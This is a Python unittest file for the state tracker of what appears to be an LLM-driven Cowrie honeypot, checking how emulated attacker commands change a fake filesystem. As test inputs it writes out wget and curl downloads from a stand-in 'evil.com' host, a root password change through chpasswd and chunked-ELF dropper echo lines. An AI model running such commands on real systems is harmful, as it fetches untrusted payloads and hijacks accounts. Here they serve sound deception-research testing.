"""
tests/test_state.py — what changed after a command ran.

StateTracker takes a plain dict plus a FakeFS and a Software, so these need no
config, no agents and no database.

Run:  python3 -m unittest discover -s tests -p "test_state.py" -v
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from shell.fakefs import FakeFS                                    # noqa: E402
from shell.software import Software                                # noqa: E402
from shell.state import (StateTracker, echo_write_parts,           # noqa: E402
                         join_raw_arg, split_raw_arg)


def tracker(cwd="/root", files=None, installed=None):
    state = {
        "cwd": cwd,
        "files": files if files is not None else {},
        "installed": installed if installed is not None else {},
        "versions": {},
        "users": {"root": {"uid": 0, "gid": 0, "home": "/root", "shell": "/bin/bash"}},
        "shadow": {"root": "$6$old"},
    }
    fs = FakeFS(state, "root", {"/", "/etc", "/tmp", "/var", "/opt"})
    sw = Software(state, base_tools=["ls"], pre_installed=[])
    return StateTracker(state, fs, sw), state


class TestEchoParser(unittest.TestCase):
    """Getting the quoting wrong corrupts what the agents are then shown."""

    def test_quoted_body_keeps_its_quotes_balanced(self):
        self.assertEqual(echo_write_parts(r"echo -ne '\x41\x42' > f"),
                         ("-ne", "'", r"\x41\x42", ">", "f"))

    def test_unquoted_body(self):
        self.assertEqual(echo_write_parts("echo hello > f"), ("", "", "hello", ">", "f"))

    def test_append_is_distinguished_from_write(self):
        self.assertEqual(echo_write_parts("echo x >> f")[3], ">>")
        self.assertEqual(echo_write_parts("echo x > f")[3], ">")

    def test_a_redirect_that_is_not_echo_is_not_claimed(self):
        self.assertIsNone(echo_write_parts("cat a > b"))

    def test_split_and_join_round_trip(self):
        for flag, quote, body in (("-ne", "'", r"\x41"), ("", "", "plain"),
                                  ("-e", '"', "a b")):
            with self.subTest(flag=flag):
                self.assertEqual(split_raw_arg(join_raw_arg(flag, quote, body)),
                                 (flag, quote, body))


class TestCwd(unittest.TestCase):
    """Tracked on EVERY path -- an LLM answering `cd` must not lose the cwd."""

    def test_cd_moves_the_working_directory(self):
        t, st = tracker()
        t.record("cd /tmp")
        self.assertEqual(st["cwd"], "/tmp")

    def test_sudo_cd_is_still_a_cd(self):
        t, st = tracker()
        t.record("sudo cd /tmp")
        self.assertEqual(st["cwd"], "/tmp")

    def test_a_failed_cd_leaves_the_cwd_alone(self):
        t, st = tracker()
        t.record("cd /nowhere")
        self.assertEqual(st["cwd"], "/root")

    def test_recording_cd_twice_is_idempotent(self):
        """The responder already handled it; re-recording must not drift."""
        t, st = tracker()
        t.record("cd /tmp")
        t.record("cd /tmp")
        self.assertEqual(st["cwd"], "/tmp")

    def test_nothing_else_is_applied_to_a_cd(self):
        t, st = tracker()
        t.record("cd /tmp")
        self.assertEqual(st["files"], {})


class TestFileWrites(unittest.TestCase):

    def test_echo_redirect_creates_the_file_at_its_absolute_path(self):
        t, st = tracker(cwd="/tmp")
        t.record("echo hello > f")
        self.assertIn("/tmp/f", st["files"])
        self.assertEqual(st["files"]["/tmp/f"]["content"], "hello")

    def test_append_with_the_same_echo_form_merges_the_payloads(self):
        r"""How chunked-ELF droppers rebuild a binary: `-ne` suppresses the
        newline, so the pieces must concatenate directly."""
        t, st = tracker()
        t.record(r"echo -ne '\x41\x42' > b")
        t.record(r"echo -ne '\x43' >> b")
        self.assertEqual(st["files"]["/root/b"]["content"], r"-ne '\x41\x42\x43'")

    def test_append_with_a_different_form_keeps_both_lines(self):
        t, st = tracker()
        t.record("echo one > f")
        t.record("echo -n two >> f")
        self.assertIn("one", st["files"]["/root/f"]["content"])
        self.assertIn("two", st["files"]["/root/f"]["content"])

    def test_size_is_the_decoded_length_not_the_raw_string(self):
        t, st = tracker()
        t.record(r"echo -ne '\x41\x42\x43' > b")
        self.assertEqual(st["files"]["/root/b"]["size"], "3B")

    def test_overwrite_replaces_rather_than_appends(self):
        t, st = tracker()
        t.record("echo one > f")
        t.record("echo two > f")
        self.assertEqual(st["files"]["/root/f"]["content"], "two")

    def test_touch_creates_an_empty_file_without_clobbering_one(self):
        t, st = tracker()
        t.record("echo keep > f")
        t.record("touch f")
        self.assertEqual(st["files"]["/root/f"]["content"], "keep")

    def test_sed_edits_stored_content(self):
        t, st = tracker()
        t.record("echo old > s")
        t.record("sed -i 's/old/new/' s")
        self.assertEqual(st["files"]["/root/s"]["content"], "new")


class TestDownloads(unittest.TestCase):

    def test_wget_records_who_holds_the_real_bytes(self):
        """Cowrie performed the transfer; the stored content is a placeholder,
        and `backend` is what tells every reader to ask Cowrie instead."""
        t, st = tracker()
        t.record("wget http://evil.com/p.sh")
        rec = st["files"]["/root/p.sh"]
        self.assertEqual(rec["backend"], "cowrie")
        self.assertEqual(rec["source"], "http://evil.com/p.sh")

    def test_curl_dash_o_uses_the_given_filename(self):
        t, st = tracker()
        t.record("curl -o out.bin http://evil.com/b")
        self.assertIn("/root/out.bin", st["files"])

    def test_a_bare_url_is_saved_under_the_hostname(self):
        """PINNED BUG, pre-existing.

            name = url.rstrip("/").split("/")[-1] or "index.html"

        rstrip("/") removes the trailing slash first, so the last segment is
        the HOSTNAME and is always truthy -- the `or "index.html"` can never
        fire. Dead code, the same shape as compute_cd's `cd -` branch.

        Real wget saves a bare domain as index.html. Here `wget http://evil.com/`
        makes a file called `evil.com`, and a later `cat index.html` finds
        nothing. Fix is to check the path part, not the whole URL."""
        t, st = tracker()
        t.record("wget http://evil.com/")
        self.assertIn("/root/evil.com", st["files"])
        self.assertNotIn("/root/index.html", st["files"])


class TestMetadata(unittest.TestCase):

    def test_chmod_plus_x_flips_the_execute_bit(self):
        t, st = tracker()
        t.record("touch s.sh")
        t.record("chmod +x s.sh")
        self.assertEqual(st["files"]["/root/s.sh"]["perms"], "-rwxr-xr-x")

    def test_numeric_chmod_becomes_an_ls_style_string(self):
        t, st = tracker()
        t.record("touch f")
        t.record("chmod 600 f")
        self.assertEqual(st["files"]["/root/f"]["perms"], "-rw-------")

    def test_chmod_on_an_unknown_file_changes_nothing(self):
        t, st = tracker()
        t.record("chmod 777 ghost")
        self.assertEqual(st["files"], {})

    def test_chpasswd_updates_only_a_real_user(self):
        t, st = tracker()
        t.record("echo root:hunter2 | chpasswd")
        self.assertIn("hunter2", st["shadow"]["root"])
        t.record("echo ghost:x | chpasswd")
        self.assertNotIn("ghost", st["shadow"])

    def test_a_printed_version_is_pinned_so_it_cannot_change(self):
        """Including when a model produced it -- it will not repeat itself."""
        t, st = tracker()
        t.record("nmap --version", "Nmap 7.80\nmore")
        self.assertEqual(st["versions"]["nmap"], "Nmap 7.80")
        t.record("nmap --version", "Nmap 9.99")
        self.assertEqual(st["versions"]["nmap"], "Nmap 7.80")


class TestLayout(unittest.TestCase):

    def test_mkdir_stores_the_key_cd_will_look_up(self):
        """`mkdir test` once stored "test" while `cd test` resolved
        "/root/test", so cd reported No such file for a directory just made."""
        t, st = tracker()
        t.record("mkdir test")
        self.assertIn("/root/test", st["files"])
        self.assertTrue(st["files"]["/root/test"]["perms"].startswith("d"))
        self.assertEqual(t.fs.compute_cd("cd test"), (True, "/root/test", None))

    def test_mkdir_p_is_handled(self):
        t, st = tracker()
        t.record("mkdir -p /opt/x")
        self.assertIn("/opt/x", st["files"])

    def test_rm_removes_a_tracked_file(self):
        t, st = tracker()
        t.record("touch f")
        t.record("rm f")
        self.assertNotIn("/root/f", st["files"])

    def test_rm_rf_is_left_to_the_response_path(self):
        """Cowrie owns what actually disappears for a recursive delete."""
        t, st = tracker()
        t.record("touch f")
        t.record("rm -rf f")
        self.assertIn("/root/f", st["files"])

    def test_mv_moves_the_record_rather_than_copying_it(self):
        t, st = tracker()
        t.record("echo x > a")
        t.record("mv a b")
        self.assertNotIn("/root/a", st["files"])
        self.assertEqual(st["files"]["/root/b"]["content"], "x")


class TestPackages(unittest.TestCase):

    def test_apt_remove_uninstalls(self):
        t, st = tracker(installed={"socat": {"version": "1.0"}})
        st["versions"]["socat"] = "socat 1.0"
        t.record("apt remove socat")
        self.assertNotIn("socat", st["installed"])
        self.assertNotIn("socat", st["versions"])

    def test_purge_counts_too_and_flags_are_skipped(self):
        t, st = tracker(installed={"socat": {"version": "1.0"}})
        t.record("apt-get purge -y socat")
        self.assertNotIn("socat", st["installed"])


class TestRelativePaths(unittest.TestCase):
    """Everything must agree with fakefs on ONE key per real file."""

    def test_a_file_made_in_tmp_is_not_a_file_in_root(self):
        t, st = tracker()
        t.record("cd /tmp")
        t.record("touch rel")
        self.assertIn("/tmp/rel", st["files"])
        self.assertNotIn("/root/rel", st["files"])

    def test_it_can_be_removed_by_its_absolute_path_from_elsewhere(self):
        t, st = tracker()
        t.record("cd /tmp")
        t.record("touch rel")
        t.record("cd /root")
        t.record("rm /tmp/rel")
        self.assertNotIn("/tmp/rel", st["files"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
